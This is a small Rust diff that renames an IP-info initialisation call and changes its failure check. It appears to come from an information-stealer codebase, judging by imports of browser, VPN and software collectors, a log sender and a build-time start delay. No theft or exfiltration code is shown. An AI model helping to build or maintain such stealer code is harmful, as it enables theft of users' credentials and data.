@@ -33,7 +33,7 @@ use collector::{Browser, Collector, Software, Vpn};
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
-use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
+use ipinfo::{IpInfo, init, unwrapped_ip_info};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::LogSenderExt;
@@ -47,7 +47,7 @@ use zip::ZipArchive;
 pub fn run() {
     include!(env!("BUILDER_START_DELAY"));
 
-    if !init_ip_info() {
+    if init().is_none() {
         panic!()
     }
 
